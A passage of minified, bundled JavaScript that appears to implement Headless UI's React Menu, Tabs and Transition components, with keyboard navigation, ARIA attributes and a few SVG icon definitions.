      itemsRef: p.createRef(),
      items: [],
      searchQuery: "",
      activeItemIndex: null,
      activationTrigger: 1,
    }),
    [{ menuState: a, itemsRef: o, buttonRef: i }, s] = l,
    u = q(t);
  ef(
    [i, o],
    (y, w) => {
      var x;
      s({ type: 1 }),
        ns(w, ts.Loose) ||
          (y.preventDefault(), (x = i.current) == null || x.focus());
    },
    a === 0
  );
  let d = _(() => {
      s({ type: 1 });
    }),
    v = p.useMemo(() => ({ open: a === 0, close: d }), [a, d]),
    g = { ref: u };
  return $.createElement(
    ps.Provider,
    { value: l },
    $.createElement(
      os,
      { value: H(a, { 0: re.Open, 1: re.Closed }) },
      G({ ourProps: g, theirProps: r, slot: v, defaultTag: X0, name: "Menu" })
    )
  );
}
let J0 = "button";
function q0(e, t) {
  var n;
  let r = Oe(),
    { id: l = `headlessui-menu-button-${r}`, ...a } = e,
    [o, i] = ka("Menu.Button"),
    s = q(o.buttonRef, t),
    u = Zr(),
    d = _((x) => {
      switch (x.key) {
        case D.Space:
        case D.Enter:
        case D.ArrowDown:
          x.preventDefault(),
            x.stopPropagation(),
            i({ type: 0 }),
            u.nextFrame(() => i({ type: 2, focus: tt.First }));
          break;
        case D.ArrowUp:
          x.preventDefault(),
            x.stopPropagation(),
            i({ type: 0 }),
            u.nextFrame(() => i({ type: 2, focus: tt.Last }));
          break;
      }
    }),
    v = _((x) => {
      switch (x.key) {
        case D.Space:
          x.preventDefault();
          break;
      }
    }),
    g = _((x) => {
      if (is(x.currentTarget)) return x.preventDefault();
      e.disabled ||
        (o.menuState === 0
          ? (i({ type: 1 }),
            u.nextFrame(() => {
              var k;
              return (k = o.buttonRef.current) == null
                ? void 0
                : k.focus({ preventScroll: !0 });
            }))
          : (x.preventDefault(), i({ type: 0 })));
    }),
    y = p.useMemo(() => ({ open: o.menuState === 0 }), [o]),
    w = {
      ref: s,
      id: l,
      type: rs(e, o.buttonRef),
      "aria-haspopup": "menu",
      "aria-controls": (n = o.itemsRef.current) == null ? void 0 : n.id,
      "aria-expanded": o.menuState === 0,
      onKeyDown: d,
      onKeyUp: v,
      onClick: g,
    };
  return G({
    ourProps: w,
    theirProps: a,
    slot: y,
    defaultTag: J0,
    name: "Menu.Button",
  });
}
let eh = "div",
  th = dt.RenderStrategy | dt.Static;
function nh(e, t) {
  var n, r;
  let l = Oe(),
    { id: a = `headlessui-menu-items-${l}`, ...o } = e,
    [i, s] = ka("Menu.Items"),
    u = q(i.itemsRef, t),
    d = Jn(i.itemsRef),
    v = Zr(),
    g = Jr(),
    y = g !== null ? (g & re.Open) === re.Open : i.menuState === 0;
  p.useEffect(() => {
    let c = i.itemsRef.current;
    c &&
      i.menuState === 0 &&
      c !== (d == null ? void 0 : d.activeElement) &&
      c.focus({ preventScroll: !0 });
  }, [i.menuState, i.itemsRef, d]),
    s1({
      container: i.itemsRef.current,
      enabled: i.menuState === 0,
      accept(c) {
        return c.getAttribute("role") === "menuitem"
          ? NodeFilter.FILTER_REJECT
          : c.hasAttribute("role")
          ? NodeFilter.FILTER_SKIP
          : NodeFilter.FILTER_ACCEPT;
      },
      walk(c) {
        c.setAttribute("role", "none");
      },
    });
  let w = _((c) => {
      var h, b;
      switch ((v.dispose(), c.key)) {
        case D.Space:
          if (i.searchQuery !== "")
            return (
              c.preventDefault(),
              c.stopPropagation(),
              s({ type: 3, value: c.key })
            );
        case D.Enter:
          if (
            (c.preventDefault(),
            c.stopPropagation(),
            s({ type: 1 }),
            i.activeItemIndex !== null)
          ) {
            let { dataRef: S } = i.items[i.activeItemIndex];
            (b = (h = S.current) == null ? void 0 : h.domRef.current) == null ||
              b.click();
          }
          Zd(i.buttonRef.current);
          break;
        case D.ArrowDown:
          return (
            c.preventDefault(),
            c.stopPropagation(),
            s({ type: 2, focus: tt.Next })
          );
        case D.ArrowUp:
          return (
            c.preventDefault(),
            c.stopPropagation(),
            s({ type: 2, focus: tt.Previous })
          );
        case D.Home:
        case D.PageUp:
          return (
            c.preventDefault(),
            c.stopPropagation(),
            s({ type: 2, focus: tt.First })
          );
        case D.End:
        case D.PageDown:
          return (
            c.preventDefault(),
            c.stopPropagation(),
            s({ type: 2, focus: tt.Last })
          );
        case D.Escape:
          c.preventDefault(),
            c.stopPropagation(),
            s({ type: 1 }),
            at().nextFrame(() => {
              var S;
              return (S = i.buttonRef.current) == null
                ? void 0
                : S.focus({ preventScroll: !0 });
            });
          break;
        case D.Tab:
          c.preventDefault(),
            c.stopPropagation(),
            s({ type: 1 }),
            at().nextFrame(() => {
              l1(i.buttonRef.current, c.shiftKey ? oe.Previous : oe.Next);
            });
          break;
        default:
          c.key.length === 1 &&
            (s({ type: 3, value: c.key }),
            v.setTimeout(() => s({ type: 4 }), 350));
          break;
      }
    }),
    x = _((c) => {
      switch (c.key) {
        case D.Space:
          c.preventDefault();
          break;
      }
    }),
    k = p.useMemo(() => ({ open: i.menuState === 0 }), [i]),
    m = {
      "aria-activedescendant":
        i.activeItemIndex === null || (n = i.items[i.activeItemIndex]) == null
          ? void 0
          : n.id,
      "aria-labelledby": (r = i.buttonRef.current) == null ? void 0 : r.id,
      id: a,
      onKeyDown: w,
      onKeyUp: x,
      role: "menu",
      tabIndex: 0,
      ref: u,
    };
  return G({
    ourProps: m,
    theirProps: o,
    slot: k,
    defaultTag: eh,
    features: th,
    visible: y,
    name: "Menu.Items",
  });
}
let rh = p.Fragment;
function lh(e, t) {
  let n = Oe(),
    { id: r = `headlessui-menu-item-${n}`, disabled: l = !1, ...a } = e,
    [o, i] = ka("Menu.Item"),
    s = o.activeItemIndex !== null ? o.items[o.activeItemIndex].id === r : !1,
    u = p.useRef(null),
    d = q(t, u);
  te(() => {
    if (o.__demoMode || o.menuState !== 0 || !s || o.activationTrigger === 0)
      return;
    let S = at();
    return (
      S.requestAnimationFrame(() => {
        var N, P;
        (P = (N = u.current) == null ? void 0 : N.scrollIntoView) == null ||
          P.call(N, { block: "nearest" });
      }),
      S.dispose
    );
  }, [o.__demoMode, u, s, o.menuState, o.activationTrigger, o.activeItemIndex]);
  let v = H0(u),
    g = p.useRef({
      disabled: l,
      domRef: u,
      get textValue() {
        return v();
      },
    });
  te(() => {
    g.current.disabled = l;
  }, [g, l]),
    te(
      () => (i({ type: 5, id: r, dataRef: g }), () => i({ type: 6, id: r })),
      [g, r]
    );
  let y = _(() => {
      i({ type: 1 });
    }),
    w = _((S) => {
      if (l) return S.preventDefault();
      i({ type: 1 }), Zd(o.buttonRef.current);
    }),
    x = _(() => {
      if (l) return i({ type: 2, focus: tt.Nothing });
      i({ type: 2, focus: tt.Specific, id: r });
    }),
    k = i1(),
    m = _((S) => k.update(S)),
    c = _((S) => {
      k.wasMoved(S) &&
        (l || s || i({ type: 2, focus: tt.Specific, id: r, trigger: 0 }));
    }),
    h = _((S) => {
      k.wasMoved(S) && (l || (s && i({ type: 2, focus: tt.Nothing })));
    }),
    b = p.useMemo(() => ({ active: s, disabled: l, close: y }), [s, l, y]);
  return G({
    ourProps: {
      id: r,
      ref: d,
      role: "menuitem",
      tabIndex: l === !0 ? void 0 : -1,
      "aria-disabled": l === !0 ? !0 : void 0,
      disabled: void 0,
      onClick: w,
      onFocus: x,
      onPointerEnter: m,
      onMouseEnter: m,
      onPointerMove: c,
      onMouseMove: c,
      onPointerLeave: h,
      onMouseLeave: h,
    },
    theirProps: a,
    slot: b,
    defaultTag: rh,
    name: "Menu.Item",
  });
}
let ah = K(Z0),
  oh = K(q0),
  ih = K(nh),
  sh = K(lh),
  cr = Object.assign(ah, { Button: oh, Items: ih, Item: sh });
function uh(e = 0) {
  let [t, n] = p.useState(e),
    r = qn(),
    l = p.useCallback(
      (s) => {
        r.current && n((u) => u | s);
      },
      [t, r]
    ),
    a = p.useCallback((s) => !!(t & s), [t]),
    o = p.useCallback(
      (s) => {
        r.current && n((u) => u & ~s);
      },
      [n, r]
    ),
    i = p.useCallback(
      (s) => {
        r.current && n((u) => u ^ s);
      },
      [n]
    );
  return { flags: t, addFlag: l, hasFlag: a, removeFlag: o, toggleFlag: i };
}
function ch({ onFocus: e }) {
  let [t, n] = p.useState(!0),
    r = qn();
  return t
    ? $.createElement(Hr, {
        as: "button",
        type: "button",
        features: Br.Focusable,
        onFocus: (l) => {
          l.preventDefault();
          let a,
            o = 50;
          function i() {
            if (o-- <= 0) {
              a && cancelAnimationFrame(a);
              return;
            }
            if (e()) {
              if ((cancelAnimationFrame(a), !r.current)) return;
              n(!1);
              return;
            }
            a = requestAnimationFrame(i);
          }
          a = requestAnimationFrame(i);
        },
      })
    : null;
}
const vf = p.createContext(null);
function dh() {
  return {
    groups: new Map(),
    get(e, t) {
      var n;
      let r = this.groups.get(e);
      r || ((r = new Map()), this.groups.set(e, r));
      let l = (n = r.get(t)) != null ? n : 0;
      r.set(t, l + 1);
      let a = Array.from(r.keys()).indexOf(t);
      function o() {
        let i = r.get(t);
        i > 1 ? r.set(t, i - 1) : r.delete(t);
      }
      return [a, o];
    },
  };
}
function fh({ children: e }) {
  let t = p.useRef(dh());
  return p.createElement(vf.Provider, { value: t }, e);
}
function gf(e) {
  let t = p.useContext(vf);
  if (!t)
    throw new Error("You must wrap your component in a <StableCollection>");
  let n = ph(),
    [r, l] = t.current.get(e, n);
  return p.useEffect(() => l, []), r;
}
function ph() {
  var e, t, n;
  let r =
    (n =
      (t =
        (e = p.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED) == null
          ? void 0
          : e.ReactCurrentOwner) == null
        ? void 0
        : t.current) != null
      ? n
      : null;
  if (!r) return Symbol();
  let l = [],
    a = r;
  for (; a; ) l.push(a.index), (a = a.return);
  return "$." + l.join(".");
}
var mh = ((e) => (
    (e[(e.Forwards = 0)] = "Forwards"), (e[(e.Backwards = 1)] = "Backwards"), e
  ))(mh || {}),
  hh = ((e) => (
    (e[(e.Less = -1)] = "Less"),
    (e[(e.Equal = 0)] = "Equal"),
    (e[(e.Greater = 1)] = "Greater"),
    e
  ))(hh || {}),
  vh = ((e) => (
    (e[(e.SetSelectedIndex = 0)] = "SetSelectedIndex"),
    (e[(e.RegisterTab = 1)] = "RegisterTab"),
    (e[(e.UnregisterTab = 2)] = "UnregisterTab"),
    (e[(e.RegisterPanel = 3)] = "RegisterPanel"),
    (e[(e.UnregisterPanel = 4)] = "UnregisterPanel"),
    e
  ))(vh || {});
let gh = {
    0(e, t) {
      var n;
      let r = ln(e.tabs, (d) => d.current),
        l = ln(e.panels, (d) => d.current),
        a = r.filter((d) => {
          var v;
          return !((v = d.current) != null && v.hasAttribute("disabled"));
        }),
        o = { ...e, tabs: r, panels: l };
      if (t.index < 0 || t.index > r.length - 1) {
        let d = H(Math.sign(t.index - e.selectedIndex), {
          [-1]: () => 1,
          0: () =>
            H(Math.sign(t.index), { [-1]: () => 0, 0: () => 0, 1: () => 1 }),
          1: () => 0,
        });
        if (a.length === 0) return o;
        let v = H(d, {
          0: () => r.indexOf(a[0]),
          1: () => r.indexOf(a[a.length - 1]),
        });
        return { ...o, selectedIndex: v === -1 ? e.selectedIndex : v };
      }
      let i = r.slice(0, t.index),
        s = [...r.slice(t.index), ...i].find((d) => a.includes(d));
      if (!s) return o;
      let u = (n = r.indexOf(s)) != null ? n : e.selectedIndex;
      return u === -1 && (u = e.selectedIndex), { ...o, selectedIndex: u };
    },
    1(e, t) {
      var n;
      if (e.tabs.includes(t.tab)) return e;
      let r = e.tabs[e.selectedIndex],
        l = ln([...e.tabs, t.tab], (o) => o.current),
        a = (n = l.indexOf(r)) != null ? n : e.selectedIndex;
      return (
        a === -1 && (a = e.selectedIndex), { ...e, tabs: l, selectedIndex: a }
      );
    },
    2(e, t) {
      return { ...e, tabs: e.tabs.filter((n) => n !== t.tab) };
    },
    3(e, t) {
      return e.panels.includes(t.panel)
        ? e
        : { ...e, panels: ln([...e.panels, t.panel], (n) => n.current) };
    },
    4(e, t) {
      return { ...e, panels: e.panels.filter((n) => n !== t.panel) };
    },
  },
  ms = p.createContext(null);
ms.displayName = "TabsDataContext";
function Qn(e) {
  let t = p.useContext(ms);
  if (t === null) {
    let n = new Error(`<${e} /> is missing a parent <Tab.Group /> component.`);
    throw (Error.captureStackTrace && Error.captureStackTrace(n, Qn), n);
  }
  return t;
}
let hs = p.createContext(null);
hs.displayName = "TabsActionsContext";
function vs(e) {
  let t = p.useContext(hs);
  if (t === null) {
    let n = new Error(`<${e} /> is missing a parent <Tab.Group /> component.`);
    throw (Error.captureStackTrace && Error.captureStackTrace(n, vs), n);
  }
  return t;
}
function yh(e, t) {
  return H(t.type, gh, e, t);
}
let wh = p.Fragment;
function xh(e, t) {
  let {
    defaultIndex: n = 0,
    vertical: r = !1,
    manual: l = !1,
    onChange: a,
    selectedIndex: o = null,
    ...i
  } = e;
  const s = r ? "vertical" : "horizontal",
    u = l ? "manual" : "auto";
  let d = o !== null,
    v = q(t),
    [g, y] = p.useReducer(yh, { selectedIndex: o ?? n, tabs: [], panels: [] }),
    w = p.useMemo(
      () => ({ selectedIndex: g.selectedIndex }),
      [g.selectedIndex]
    ),
    x = He(a || (() => {})),
    k = He(g.tabs),
    m = p.useMemo(() => ({ orientation: s, activation: u, ...g }), [s, u, g]),
    c = _((C) => (y({ type: 1, tab: C }), () => y({ type: 2, tab: C }))),
    h = _((C) => (y({ type: 3, panel: C }), () => y({ type: 4, panel: C }))),
    b = _((C) => {
      S.current !== C && x.current(C), d || y({ type: 0, index: C });
    }),
    S = He(d ? e.selectedIndex : g.selectedIndex),
    N = p.useMemo(() => ({ registerTab: c, registerPanel: h, change: b }), []);
  te(() => {
    y({ type: 0, index: o ?? n });
  }, [o]),
    te(() => {
      if (S.current === void 0 || g.tabs.length <= 0) return;
      let C = ln(g.tabs, (I) => I.current);
      C.some((I, T) => g.tabs[T] !== I) && b(C.indexOf(g.tabs[S.current]));
    });
  let P = { ref: v };
  return $.createElement(
    fh,
    null,
    $.createElement(
      hs.Provider,
      { value: N },
      $.createElement(
        ms.Provider,
        { value: m },
        m.tabs.length <= 0 &&
          $.createElement(ch, {
            onFocus: () => {
              var C, I;
              for (let T of k.current)
                if (((C = T.current) == null ? void 0 : C.tabIndex) === 0)
                  return (I = T.current) == null || I.focus(), !0;
              return !1;
            },
          }),
        G({ ourProps: P, theirProps: i, slot: w, defaultTag: wh, name: "Tabs" })
      )
    )
  );
}
let bh = "div";
function kh(e, t) {
  let { orientation: n, selectedIndex: r } = Qn("Tab.List"),
    l = q(t);
  return G({
    ourProps: { ref: l, role: "tablist", "aria-orientation": n },
    theirProps: e,
    slot: { selectedIndex: r },
    defaultTag: bh,
    name: "Tabs.List",
  });
}
let Sh = "button";
function Eh(e, t) {
  var n, r;
  let l = Oe(),
    { id: a = `headlessui-tabs-tab-${l}`, ...o } = e,
    {
      orientation: i,
      activation: s,
      selectedIndex: u,
      tabs: d,
      panels: v,
    } = Qn("Tab"),
    g = vs("Tab"),
    y = Qn("Tab"),
    w = p.useRef(null),
    x = q(w, t);
  te(() => g.registerTab(w), [g, w]);
  let k = gf("tabs"),
    m = d.indexOf(w);
  m === -1 && (m = k);
  let c = m === u,
    h = _((T) => {
      var A;
      let fe = T();
      if (fe === $n.Success && s === "auto") {
        let je = (A = Zn(w)) == null ? void 0 : A.activeElement,
          Ke = y.tabs.findIndex((Ye) => Ye.current === je);
        Ke !== -1 && g.change(Ke);
      }
      return fe;
    }),
    b = _((T) => {
      let A = d.map((fe) => fe.current).filter(Boolean);
      if (T.key === D.Space || T.key === D.Enter) {
        T.preventDefault(), T.stopPropagation(), g.change(m);
        return;
      }
      switch (T.key) {
        case D.Home:
        case D.PageUp:
          return (
            T.preventDefault(), T.stopPropagation(), h(() => et(A, oe.First))
          );
        case D.End:
        case D.PageDown:
          return (
            T.preventDefault(), T.stopPropagation(), h(() => et(A, oe.Last))
          );
      }
      if (
        h(() =>
          H(i, {
            vertical() {
              return T.key === D.ArrowUp
                ? et(A, oe.Previous | oe.WrapAround)
                : T.key === D.ArrowDown
                ? et(A, oe.Next | oe.WrapAround)
                : $n.Error;
            },
            horizontal() {
              return T.key === D.ArrowLeft
                ? et(A, oe.Previous | oe.WrapAround)
                : T.key === D.ArrowRight
                ? et(A, oe.Next | oe.WrapAround)
                : $n.Error;
            },
          })
        ) === $n.Success
      )
        return T.preventDefault();
    }),
    S = p.useRef(!1),
    N = _(() => {
      var T;
      S.current ||
        ((S.current = !0),
        (T = w.current) == null || T.focus({ preventScroll: !0 }),
        g.change(m),
        Xr(() => {
          S.current = !1;
        }));
    }),
    P = _((T) => {
      T.preventDefault();
    }),
    C = p.useMemo(() => ({ selected: c }), [c]),
    I = {
      ref: x,
      onKeyDown: b,
      onMouseDown: P,
      onClick: N,
      id: a,
      role: "tab",
      type: rs(e, w),
      "aria-controls":
        (r = (n = v[m]) == null ? void 0 : n.current) == null ? void 0 : r.id,
      "aria-selected": c,
      tabIndex: c ? 0 : -1,
    };
  return G({
    ourProps: I,
    theirProps: o,
    slot: C,
    defaultTag: Sh,
    name: "Tabs.Tab",
  });
}
let Nh = "div";
function Ch(e, t) {
  let { selectedIndex: n } = Qn("Tab.Panels"),
    r = q(t),
    l = p.useMemo(() => ({ selectedIndex: n }), [n]);
  return G({
    ourProps: { ref: r },
    theirProps: e,
    slot: l,
    defaultTag: Nh,
    name: "Tabs.Panels",
  });
}
let Ph = "div",
  Th = dt.RenderStrategy | dt.Static;
function Lh(e, t) {
  var n, r, l, a;
  let o = Oe(),
    { id: i = `headlessui-tabs-panel-${o}`, tabIndex: s = 0, ...u } = e,
    { selectedIndex: d, tabs: v, panels: g } = Qn("Tab.Panel"),
    y = vs("Tab.Panel"),
    w = p.useRef(null),
    x = q(w, t);
  te(() => y.registerPanel(w), [y, w]);
  let k = gf("panels"),
    m = g.indexOf(w);
  m === -1 && (m = k);
  let c = m === d,
    h = p.useMemo(() => ({ selected: c }), [c]),
    b = {
      ref: x,
      id: i,
      role: "tabpanel",
      "aria-labelledby":
        (r = (n = v[m]) == null ? void 0 : n.current) == null ? void 0 : r.id,
      tabIndex: c ? s : -1,
    };
  return !c && ((l = u.unmount) == null || l) && !((a = u.static) != null && a)
    ? $.createElement(Hr, { as: "span", "aria-hidden": "true", ...b })
    : G({
        ourProps: b,
        theirProps: u,
        slot: h,
        defaultTag: Ph,
        features: Th,
        visible: c,
        name: "Tabs.Panel",
      });
}
let jh = K(Eh),
  $h = K(xh),
  _h = K(kh),
  Fh = K(Ch),
  Rh = K(Lh),
  Zt = Object.assign(jh, { Group: $h, List: _h, Panels: Fh, Panel: Rh });
function Ih(e) {
  let t = { called: !1 };
  return (...n) => {
    if (!t.called) return (t.called = !0), e(...n);
  };
}
function lo(e, ...t) {
  e && t.length > 0 && e.classList.add(...t);
}
function ao(e, ...t) {
  e && t.length > 0 && e.classList.remove(...t);
}
function Mh(e, t) {
  let n = at();
  if (!e) return n.dispose;
  let { transitionDuration: r, transitionDelay: l } = getComputedStyle(e),
    [a, o] = [r, l].map((s) => {
      let [u = 0] = s
        .split(",")
        .filter(Boolean)
        .map((d) => (d.includes("ms") ? parseFloat(d) : parseFloat(d) * 1e3))
        .sort((d, v) => v - d);
      return u;
    }),
    i = a + o;
  if (i !== 0) {
    n.group((u) => {
      u.setTimeout(() => {
        t(), u.dispose();
      }, i),
        u.addEventListener(e, "transitionrun", (d) => {
          d.target === d.currentTarget && u.dispose();
        });
    });
    let s = n.addEventListener(e, "transitionend", (u) => {
      u.target === u.currentTarget && (t(), s());
    });
  } else t();
  return n.add(() => t()), n.dispose;
}
function Dh(e, t, n, r) {
  let l = n ? "enter" : "leave",
    a = at(),
    o = r !== void 0 ? Ih(r) : () => {};
  l === "enter" && (e.removeAttribute("hidden"), (e.style.display = ""));
  let i = H(l, { enter: () => t.enter, leave: () => t.leave }),
    s = H(l, { enter: () => t.enterTo, leave: () => t.leaveTo }),
    u = H(l, { enter: () => t.enterFrom, leave: () => t.leaveFrom });
  return (
    ao(
      e,
      ...t.base,
      ...t.enter,
      ...t.enterTo,
      ...t.enterFrom,
      ...t.leave,
      ...t.leaveFrom,
      ...t.leaveTo,
      ...t.entered
    ),
    lo(e, ...t.base, ...i, ...u),
    a.nextFrame(() => {
      ao(e, ...t.base, ...i, ...u),
        lo(e, ...t.base, ...i, ...s),
        Mh(
          e,
          () => (ao(e, ...t.base, ...i), lo(e, ...t.base, ...t.entered), o())
        );
    }),
    a.dispose
  );
}
function Oh({
  immediate: e,
  container: t,
  direction: n,
  classes: r,
  onStart: l,
  onStop: a,
}) {
  let o = qn(),
    i = Zr(),
    s = He(n);
  te(() => {
    e && (s.current = "enter");
  }, [e]),
    te(() => {
      let u = at();
      i.add(u.dispose);
      let d = t.current;
      if (d && s.current !== "idle" && o.current)
        return (
          u.dispose(),
          l.current(s.current),
          u.add(
            Dh(d, r.current, s.current === "enter", () => {
              u.dispose(), a.current(s.current);
            })
          ),
          u.dispose
        );
    }, [n]);
}
function Ct(e = "") {
  return e.split(/\s+/).filter((t) => t.length > 1);
}
let Sa = p.createContext(null);
Sa.displayName = "TransitionContext";
var zh = ((e) => ((e.Visible = "visible"), (e.Hidden = "hidden"), e))(zh || {});
function Ah() {
  let e = p.useContext(Sa);
  if (e === null)
    throw new Error(
      "A <Transition.Child /> is used but it is missing a parent <Transition /> or <Transition.Root />."
    );
  return e;
}
function Wh() {
  let e = p.useContext(Ea);
  if (e === null)
    throw new Error(
      "A <Transition.Child /> is used but it is missing a parent <Transition /> or <Transition.Root />."
    );
  return e;
}
let Ea = p.createContext(null);
Ea.displayName = "NestingContext";
function Na(e) {
  return "children" in e
    ? Na(e.children)
    : e.current
        .filter(({ el: t }) => t.current !== null)
        .filter(({ state: t }) => t === "visible").length > 0;
}
function yf(e, t) {
  let n = He(e),
    r = p.useRef([]),
    l = qn(),
    a = Zr(),
    o = _((y, w = Rt.Hidden) => {
      let x = r.current.findIndex(({ el: k }) => k === y);
      x !== -1 &&
        (H(w, {
          [Rt.Unmount]() {
            r.current.splice(x, 1);
          },
          [Rt.Hidden]() {
            r.current[x].state = "hidden";
          },
        }),
        a.microTask(() => {
          var k;
          !Na(r) && l.current && ((k = n.current) == null || k.call(n));
        }));
    }),
    i = _((y) => {
      let w = r.current.find(({ el: x }) => x === y);
      return (
        w
          ? w.state !== "visible" && (w.state = "visible")
          : r.current.push({ el: y, state: "visible" }),
        () => o(y, Rt.Unmount)
      );
    }),
    s = p.useRef([]),
    u = p.useRef(Promise.resolve()),
    d = p.useRef({ enter: [], leave: [], idle: [] }),
    v = _((y, w, x) => {
      s.current.splice(0),
        t &&
          (t.chains.current[w] = t.chains.current[w].filter(([k]) => k !== y)),
        t == null ||
          t.chains.current[w].push([
            y,
            new Promise((k) => {
              s.current.push(k);
            }),
          ]),
        t == null ||
          t.chains.current[w].push([
            y,
            new Promise((k) => {
              Promise.all(d.current[w].map(([m, c]) => c)).then(() => k());
            }),
          ]),
        w === "enter"
          ? (u.current = u.current
              .then(() => (t == null ? void 0 : t.wait.current))
              .then(() => x(w)))
          : x(w);
    }),
    g = _((y, w, x) => {
      Promise.all(d.current[w].splice(0).map(([k, m]) => m))
        .then(() => {
          var k;
          (k = s.current.shift()) == null || k();
        })
        .then(() => x(w));
    });
  return p.useMemo(
    () => ({
      children: r,
      register: i,
      unregister: o,
      onStart: v,
      onStop: g,
      wait: u,
      chains: d,
    }),
    [i, o, r, v, g, d, u]
  );
}
function Uh() {}
let Bh = ["beforeEnter", "afterEnter", "beforeLeave", "afterLeave"];
function Iu(e) {
  var t;
  let n = {};
  for (let r of Bh) n[r] = (t = e[r]) != null ? t : Uh;
  return n;
}
function Hh(e) {
  let t = p.useRef(Iu(e));
  return (
    p.useEffect(() => {
      t.current = Iu(e);
    }, [e]),
    t
  );
}
let Vh = "div",
  wf = dt.RenderStrategy;
function Qh(e, t) {
  var n, r;
  let {
      beforeEnter: l,
      afterEnter: a,
      beforeLeave: o,
      afterLeave: i,
      enter: s,
      enterFrom: u,
      enterTo: d,
      entered: v,
      leave: g,
      leaveFrom: y,
      leaveTo: w,
      ...x
    } = e,
    k = p.useRef(null),
    m = q(k, t),
    c = (n = x.unmount) == null || n ? Rt.Unmount : Rt.Hidden,
    { show: h, appear: b, initial: S } = Ah(),
    [N, P] = p.useState(h ? "visible" : "hidden"),
    C = Wh(),
    { register: I, unregister: T } = C;
  p.useEffect(() => I(k), [I, k]),
    p.useEffect(() => {
      if (c === Rt.Hidden && k.current) {
        if (h && N !== "visible") {
          P("visible");
          return;
        }
        return H(N, { hidden: () => T(k), visible: () => I(k) });
      }
    }, [N, k, I, T, h, c]);
  let A = He({
      base: Ct(x.className),
      enter: Ct(s),
      enterFrom: Ct(u),
      enterTo: Ct(d),
      entered: Ct(v),
      leave: Ct(g),
      leaveFrom: Ct(y),
      leaveTo: Ct(w),
    }),
    fe = Hh({ beforeEnter: l, afterEnter: a, beforeLeave: o, afterLeave: i }),
    je = Xn();
  p.useEffect(() => {
    if (je && N === "visible" && k.current === null)
      throw new Error(
        "Did you forget to passthrough the `ref` to the actual DOM node?"
      );
  }, [k, N, je]);
  let Ke = S && !b,
    Ye = b && h && S,
    Gt = !je || Ke ? "idle" : h ? "enter" : "leave",
    Ge = uh(0),
    L = _((ue) =>
      H(ue, {
        enter: () => {
          Ge.addFlag(re.Opening), fe.current.beforeEnter();
        },
        leave: () => {
          Ge.addFlag(re.Closing), fe.current.beforeLeave();
        },
        idle: () => {},
      })
    ),
    F = _((ue) =>
      H(ue, {
        enter: () => {
          Ge.removeFlag(re.Opening), fe.current.afterEnter();
        },
        leave: () => {
          Ge.removeFlag(re.Closing), fe.current.afterLeave();
        },
        idle: () => {},
      })
    ),
    R = yf(() => {
      P("hidden"), T(k);
    }, C),
    W = p.useRef(!1);
  Oh({
    immediate: Ye,
    container: k,
    classes: A,
    direction: Gt,
    onStart: He((ue) => {
      (W.current = !0), R.onStart(k, ue, L);
    }),
    onStop: He((ue) => {
      (W.current = !1),
        R.onStop(k, ue, F),
        ue === "leave" && !Na(R) && (P("hidden"), T(k));
    }),
  });
  let U = x,
    Xt = { ref: m };
  return (
    Ye
      ? (U = {
          ...U,
          className: ra(
            x.className,
            ...A.current.enter,
            ...A.current.enterFrom
          ),
        })
      : W.current &&
        ((U.className = ra(
          x.className,
          (r = k.current) == null ? void 0 : r.className
        )),
        U.className === "" && delete U.className),
    $.createElement(
      Ea.Provider,
      { value: R },
      $.createElement(
        os,
        { value: H(N, { visible: re.Open, hidden: re.Closed }) | Ge.flags },
        G({
          ourProps: Xt,
          theirProps: U,
          defaultTag: Vh,
          features: wf,
          visible: N === "visible",
          name: "Transition.Child",
        })
      )
    )
  );
}
function Kh(e, t) {
  let { show: n, appear: r = !1, unmount: l = !0, ...a } = e,
    o = p.useRef(null),
    i = q(o, t);
  Xn();
  let s = Jr();
  if (
    (n === void 0 && s !== null && (n = (s & re.Open) === re.Open),
    ![!0, !1].includes(n))
  )
    throw new Error(
      "A <Transition /> is used but it is missing a `show={true | false}` prop."
    );
  let [u, d] = p.useState(n ? "visible" : "hidden"),
    v = yf(() => {
      d("hidden");
    }),
    [g, y] = p.useState(!0),
    w = p.useRef([n]);
  te(() => {
    g !== !1 &&
      w.current[w.current.length - 1] !== n &&
      (w.current.push(n), y(!1));
  }, [w, n]);
  let x = p.useMemo(() => ({ show: n, appear: r, initial: g }), [n, r, g]);
  p.useEffect(() => {
    if (n) d("visible");
    else if (!Na(v)) d("hidden");
    else {
      let h = o.current;
      if (!h) return;
      let b = h.getBoundingClientRect();
      b.x === 0 && b.y === 0 && b.width === 0 && b.height === 0 && d("hidden");
    }
  }, [n, v]);
  let k = { unmount: l },
    m = _(() => {
      var h;
      g && y(!1), (h = e.beforeEnter) == null || h.call(e);
    }),
    c = _(() => {
      var h;
      g && y(!1), (h = e.beforeLeave) == null || h.call(e);
    });
  return $.createElement(
    Ea.Provider,
    { value: v },
    $.createElement(
      Sa.Provider,
      { value: x },
      G({
        ourProps: {
          ...k,
          as: p.Fragment,
          children: $.createElement(xf, {
            ref: i,
            ...k,
            ...a,
            beforeEnter: m,
            beforeLeave: c,
          }),
        },
        theirProps: {},
        defaultTag: p.Fragment,
        features: wf,
        visible: u === "visible",
        name: "Transition",
      })
    )
  );
}
function Yh(e, t) {
  let n = p.useContext(Sa) !== null,
    r = Jr() !== null;
  return $.createElement(
    $.Fragment,
    null,
    !n && r
      ? $.createElement(ai, { ref: t, ...e })
      : $.createElement(xf, { ref: t, ...e })
  );
}
let ai = K(Kh),
  xf = K(Qh),
  Gh = K(Yh),
  we = Object.assign(ai, { Child: Gh, Root: ai });
const oi = {
    menu: f.jsx("svg", {
      xmlns: "http://www.w3.org/2000/svg",
      viewBox: "0 0 24 24",
      children: f.jsx("path", {
        d: "M3,6H21V8H3V6M3,11H21V13H3V11M3,16H21V18H3V16Z",
      }),
    }),
    close: f.jsx("svg", {
      xmlns: "http://www.w3.org/2000/svg",
      viewBox: "0 0 24 24",
      children: f.jsx("path", {
        d: "M19,6.41L17.59,5L12,10.59L6.41,5L5,6.41L10.59,12L5,17.59L6.41,19L12,13.41L17.59,19L19,17.59L13.41,12L19,6.41Z",
      }),
    }),
    shuriken: f.jsx("svg", {
      xmlns: "http://www.w3.org/2000/svg",
      viewBox: "0 0 24 24",
      children: f.jsx("path", {
        d: "M14.5 9.5L12 2L9.5 9.5L2 12L9.5 14.5L12 22L14.5 14.5L22 12L14.5 9.5M12 13.7C11.1 13.7 10.3 13 10.3 12C10.3 11.1 11 10.3 12 10.3C12.9 10.3 13.7 11 13.7 12C13.7 12.9 12.9 13.7 12 13.7Z",
      }),
    }),
  },
  en = (...e) => e.filter(Boolean).join(" "),
  un = ({
    variant: e = "filled",
